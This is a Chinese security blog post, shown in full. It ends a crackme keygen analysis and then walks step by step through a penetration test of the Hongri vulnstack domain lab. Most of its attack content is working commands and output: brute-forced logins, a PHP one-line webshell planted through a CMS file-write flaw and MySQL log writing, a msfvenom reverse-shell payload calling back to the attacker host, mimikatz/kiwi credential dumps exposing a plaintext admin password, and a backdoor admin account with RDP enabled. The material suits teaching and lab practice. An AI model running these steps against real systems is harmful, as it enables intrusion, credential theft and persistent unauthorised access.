<span class="hljs-number">0040135</span>C  |.  <span class="hljs-number">7</span>E <span class="hljs-number">02</span>         |jle <span class="hljs-type">short</span> TraceMe.<span class="hljs-number">00401360</span>
0040135E  |.  33C0          |xor eax,eax    ;&#123;eax = 0;&#125;
<span class="hljs-number">00401360</span>  |&gt;  <span class="hljs-number">33</span>D2          |<span class="hljs-built_in">xor</span> edx,edx    ;edx = <span class="hljs-number">0</span>;
<span class="hljs-number">00401362</span>  |.  <span class="hljs-number">33</span>DB          |<span class="hljs-built_in">xor</span> ebx,ebx    ;ebx = <span class="hljs-number">0</span>
<span class="hljs-number">00401364</span>  |.  <span class="hljs-number">8</span>A1429        |mov dl,<span class="hljs-type">byte</span> ptr ds:[ecx+ebp]   ; dl = ebp + ecx = 从用户名的第四个字符开始计算
<span class="hljs-number">00401367</span>  |.  <span class="hljs-number">8</span>A98 <span class="hljs-number">30504000</span> |mov bl,<span class="hljs-type">byte</span> ptr ds:[eax+<span class="hljs-number">0</span>x405030]  ;bl = 数据表第eax个字符，数据表的内存地址为<span class="hljs-number">0</span>x00405030处，查找其数值为<span class="hljs-number">0</span>C <span class="hljs-number">0</span>A <span class="hljs-number">13</span> <span class="hljs-number">09</span> <span class="hljs-number">0</span>C <span class="hljs-number">0</span>B <span class="hljs-number">0</span>A <span class="hljs-number">08</span>(根据判断语句<span class="hljs-number">0</span>x00401359可知，只有<span class="hljs-number">8</span>个数据)
<span class="hljs-number">0040136</span>D  |.  <span class="hljs-number">0</span>FAFD3        |imul edx,ebx   ;edx = edx * ebx
<span class="hljs-number">00401370</span>  |.  <span class="hljs-number">03</span>F2          |add esi,edx    ;esi = esi + edx
<span class="hljs-number">00401372</span>  |.  <span class="hljs-number">41</span>            |inc ecx    ;ecx++
<span class="hljs-number">00401373</span>  |.  <span class="hljs-number">40</span>            |inc eax    ;eax++;
<span class="hljs-number">00401374</span>  |.  <span class="hljs-number">3</span>BCF          |cmp ecx,edi    ;<span class="hljs-keyword">if</span>(ecx&lt;edi)   如果未取完用户名字符则继续
00401376  |.^ 7C E1         \jl short   ;&#123;goto 0x00401359&#125; TraceMe.00401359
<span class="hljs-number">00401378</span>  |.  <span class="hljs-number">5</span>B            pop ebx   ;计算结束                               ;  <span class="hljs-number">0012</span>FAE8
<span class="hljs-number">00401379</span>  |&gt;  <span class="hljs-number">56</span>            push esi                                 ; /&lt;%ld&gt; = <span class="hljs-number">40504</span>F (<span class="hljs-number">4214863</span>.)</code></pre>



<p>使用python写出注册机</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crake_traceme</span>():</span>
	code, <span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>
	username = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入用户名&quot;</span>)
	num = [<span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x08</span>]
	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(username)):
    	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> &gt; <span class="hljs-number">7</span>:
        	<span class="hljs-built_in">len</span> = <span class="hljs-number">0</span>
    	code += <span class="hljs-built_in">ord</span>(username[i]) * num[<span class="hljs-built_in">len</span>]
    	<span class="hljs-built_in">len</span> += <span class="hljs-number">1</span>
	print(<span class="hljs-string">&quot;The code is:\n&quot;</span> + <span class="hljs-built_in">str</span>(code))
crake_traceme()</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210418222548281.png" alt="image-20210418222548281">)<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210514155437404.png" alt="image-20210514155437404"></p>
<h1 id="一次域渗透测试攻击"><a href="#一次域渗透测试攻击" class="headerlink" title="一次域渗透测试攻击"></a>一次域渗透测试攻击</h1><p>第一次做渗透测试，有的地方做的不是很好</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用的靶机是红日安全提供的，地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<p>搭建过程中有一点需要注意</p>
<p>Web服务主机win7有两块网卡，需要在设置中再添加一块网卡</p>
<p>网卡一连接到<code>VMnet2</code>中，作为内网环境</p>
<p>网卡二连接到<code>VMnet1</code>中，作为公网环境，并攻击机连到<code>VMnet1</code>中,确保其可以访问网站主页</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130030032.png" alt="image-20210511130030032" style="zoom:50%;">

<p>剩下的两台域控主机直接连接到<code>VMnet2</code>中即可，可以与web服务器通信</p>
<p>修改window10物理机的VMnet1网卡</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511214717086.png" alt="image-20210511214717086" style="zoom:67%;">

<p>这样物理机和kali都可以访问到靶机网站</p>
<p><strong>实验拓扑图:</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511124808522.png" alt="image-20210511124808522" style="zoom: 50%;">

<ul>
<li>web服务器(win7): 公网IP:192.168.74.128   内网IP: 192.168.52.143 主机名:stu1</li>
<li>域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh</li>
<li>域控(Windows Server 2008)：192.168.52.138 主机名：owa</li>
</ul>
<p>web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="网站探测"><a href="#网站探测" class="headerlink" title="网站探测"></a>网站探测</h3><p>首先访问网站主页: <a href="http://192.168.74.129/yxcms">http://192.168.74.129/yxcms</a></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130446365.png" alt="image-20210511130446365" style="zoom: 50%;">

<p>先扫描一下目录</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511153857974.png" alt="image-20210511153857974" style="zoom:50%;">

<p>可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如<code>/public</code>,可以看到该目录下的很多内容，但是没有想要内容</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511154129595.png" alt="image-20210511154129595" style="zoom: 33%;">



<h3 id="网站漏洞利用getshell"><a href="#网站漏洞利用getshell" class="headerlink" title="网站漏洞利用getshell"></a>网站漏洞利用getshell</h3><ul>
<li><p>经过探测网站的后台登录页面是<code>http://192.168.74.129/yxcms/index.php?r=admin/index/login</code></p>
<p>经过爆破很容易试出密码为<code>123456</code></p>
<p>成功登录后台</p>
</li>
</ul>
<ul>
<li><p>尝试搜索网站已发现的漏洞</p>
<p>这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞</p>
<p><a href="https://www.freebuf.com/column/162886.html">代码审计| yxcms app 1.4.6 漏洞集合</a></p>
<p>可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞</p>
<p>访问<code>http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default</code>，这里可以写入php文件</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155855512.png" alt="image-20210511155855512" style="zoom:50%;">



</li>
</ul>
<p>写入一句话木马</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155949294.png" alt="image-20210511155949294"></p>
<p>写入成功后，访问<code>http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php</code>可以看到已经成功写入一句话木马，之后就是用蚁剑连接</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160216194.png" alt="image-20210511160216194" style="zoom: 33%;">

<p>成功获取shell，并且是system权限，这是由于该网站管理员直接使用<code>administrator</code>登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160418538.png" alt="image-20210511160418538" style="zoom:50%;">



<h3 id="使用phpMyAdmin-Getshell"><a href="#使用phpMyAdmin-Getshell" class="headerlink" title="使用phpMyAdmin Getshell"></a>使用phpMyAdmin Getshell</h3><p>扫描<code>http://192.168.74.129/</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160728113.png" alt="image-20210511160728113" style="zoom:50%;">

<p>直接使用工具爆破，很容易得到，用户名和密码都为<code>root</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" alt="image-20210511132208919" style="zoom:50%;">

<p>一开始的想法是利用写<code>into outfile</code>写木马getshell，但是由于网站的<code>secure_file_priv</code>的值为NULL，所以我们不能利用写<code>into outfile</code>写木马getshell</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" alt="image-20210511161606685" style="zoom:50%;">

<p>但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:<a href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysql日志木马</a></p>
<p>执行下列命令</p>
<pre><code class="hljs mysql">set global general_log&#x3D;on;                                     #开启日志
set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;;  #设置指定文件为网站日志存放文件
SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;               		   #执行该语句，会将该命令写入日志文件</code></pre>

<p>执行完命令，便可以在网站根目录下看到<code>hack.php</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" alt="image-20210511162058801"></p>
<p>浏览器访问<code>http://192.168.74.129/yxcms/hack.php</code>，一句话木马访问成功</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511162146968.png" alt="image-20210511162146968" style="zoom:50%;">

<h2 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h2><p>在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。</p>
<p>执行<code>whoami</code> ,<code>ipconfig</code>,<code>net localgroup administrators</code>命令我们知道当前的用户身份是 <code>administrator</code> ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162608469.png" alt="image-20210511162608469" style="zoom: 50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162902010.png" alt="image-20210511162902010" style="zoom: 80%;"></p>
<h3 id="获取MSF-shell"><a href="#获取MSF-shell" class="headerlink" title="获取MSF shell"></a>获取MSF shell</h3><p>使用<code>msf</code>生成木马</p>
<ul>
<li><p>kali终端输入<code>msfconsole</code>，进入msf</p>
</li>
<li><p>选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口</p>
<pre><code class="hljs awk">use windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp</code></pre>

<p>输入<code>show options</code>查看方法</p>
</li>
<li><p>新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中</p>
</li>
</ul>
<pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp lhost=<span class="hljs-number">192.168.74.130</span> lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-number">1</span>.exe</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" alt="image-20210511163917527" style="zoom: 67%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511164107563.png" alt="image-20210511164107563" style="zoom: 50%;">

<ul>
<li><p>再次输入msfconsole 进入应用，输入<code>use exploit/multi/handler</code>进入管理工具，获取shell权限，命令如下</p>
<pre><code class="hljs routeros">use exploit/multi/handler
<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter_reverse_tcp
<span class="hljs-builtin-name">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span>
<span class="hljs-string">run</span></code></pre>

<p>即可获取shell</p>
</li>
</ul>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511165317518.png" alt="image-20210511165317518" style="zoom:67%;">



<h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><p>在<code>meterpreter</code>中运行<code>run windows/gather/smart_hashdump</code>,但是出现错误，提示需要system进程权限</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511182726579.png" alt="image-20210511182726579" style="zoom:67%;">

<p>使用<code>migrate 388</code>将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的</p>
<p>再使用<code>run windows/gather/smart_hashdump</code></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183026072.png" alt="image-20210511183026072" style="zoom: 50%;">

<p>接下来是破解该密码</p>
<p><strong>加载 kiwi模块</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span>
<span class="hljs-attribute">creds_all</span></code></pre>

<p>结果如下</p>
<pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
<span class="hljs-symbol">msv</span> credentials
===============

<span class="hljs-symbol">Username</span>       Domain  LM                                NTLM                              SHA1
--------       ------  --                                ----                              ----
<span class="hljs-symbol">Administrator</span>  GOD     edea194d76c77d87840ac10a764c7362  <span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5  <span class="hljs-number">343</span>f44056ed02360aead5618dd42e4614b5f70cf
<span class="hljs-symbol">STU1$</span>          GOD                                       cde51539f42c2854d74e82db1173dd8c  <span class="hljs-number">50950</span>d918317edf0ab95661a565c6ebf1151fe3b

<span class="hljs-symbol">wdigest</span> credentials
===================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
(null)         (null)  (null)
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">STU1$</span>          GOD     <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b

<span class="hljs-symbol">tspkg</span> credentials
=================

<span class="hljs-symbol">Username</span>       Domain  Password
--------       ------  --------
<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span>

<span class="hljs-symbol">kerberos</span> credentials
====================

<span class="hljs-symbol">Username</span>       Domain   Password
--------       ------   --------
(null)         (null)   (null)
<span class="hljs-symbol">Administrator</span>  GOD.ORG  hongrisec<span class="hljs-comment">@2019</span>
<span class="hljs-symbol">stu1$</span>          GOD.ORG  <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b</code></pre>

<p>可以看到密码已经被破解处理</p>
<pre><code class="hljs angelscript">password：<span class="hljs-symbol">hongrisec@</span><span class="hljs-number">2019</span></code></pre>



<h3 id="远程桌面登录"><a href="#远程桌面登录" class="headerlink" title="远程桌面登录"></a>远程桌面登录</h3><p>已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。</p>
<p>直接使用administrator登录的话可能被管理员发现，所以使用第二种方法</p>
<pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> hack <span class="hljs-keyword">password</span>  /<span class="hljs-keyword">add</span>
net localgroup administrators hack /<span class="hljs-keyword">add</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183802017.png" alt="image-20210511183802017" style="zoom: 50%;">

<p>查看主机是否开启<code>3389</code>端口</p>
<pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">3389</span> -v <span class="hljs-number">192.168.74.129</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184005186.png" alt="image-20210511184005186" style="zoom:50%;">

<p>可以发现是关闭的。</p>
<p>使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功)</p>
<pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184531850.png" alt="image-20210511184531850" style="zoom:67%;">

<p>再次扫描就会发现3389端口已经打开</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184630200.png" alt="image-20210511184630200" style="zoom:67%;">

<p>直接连接即可</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511185014529.png" alt="image-20210511185014529" style="zoom:50%;">

<h3 id="添加路由、挂Socks4a代理"><a href="#添加路由、挂Socks4a代理" class="headerlink" title="添加路由、挂Socks4a代理"></a>添加路由、挂Socks4a代理</h3><ul>
<li><p>添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机</p>
</li>
<li><p>添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务</p>
</li>
</ul>
<p>注：添加路由一定要在挂代理之前，因为代理需要用到路由功能</p>
<p>在获取<code>shell</code>的机器上添加路由</p>
<pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-builtin-name">run</span> get_local_subnets
meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -s 192.168.21.0/24
<span class="hljs-comment"># 添加路由</span>
meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -p
<span class="hljs-comment"># 显示路由</span>
meterpreter &gt;<span class="hljs-built_in"> route </span>flush 
<span class="hljs-comment"># 删除</span></code></pre>

<p>使用<code>run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</code>，查看存活的主机</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" alt="image-20210511193307727" style="zoom: 50%;">

<p>然后建立<code>socks4</code>代理</p>
<pre><code class="hljs pgsql">meterpreter &gt; background
msf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use auxiliary/<span class="hljs-keyword">server</span>/socks4a
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvhost <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>
